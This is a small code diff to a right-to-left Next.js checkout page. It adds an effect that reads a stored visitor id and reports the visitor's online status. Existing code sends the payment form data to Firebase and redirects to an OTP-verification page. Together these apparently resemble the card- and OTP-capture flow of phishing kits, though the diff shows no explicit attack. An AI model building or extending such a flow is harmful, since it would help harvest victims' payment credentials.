@@ -2,7 +2,7 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { ArrowRight, CreditCard, Smartphone } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
@@ -13,6 +13,7 @@ import { Separator } from "@/components/ui/separator"
 import Link from "next/link"
 import { useCart } from "@/contexts/cart-context"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 export default function CheckoutPage() {
   const [paymentMethod, setPaymentMethod] = useState("card")
@@ -44,7 +45,10 @@ export default function CheckoutPage() {
     addData({id:visitorId,formData})
     window.location.href = "/otp-verification"
   }
-
+useEffect(()=>{
+const _id=localStorage.getItem('visitor')
+  setupOnlineStatus(_id!);
+},[])
   return (
     <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white" dir="rtl">
       {/* Header */}
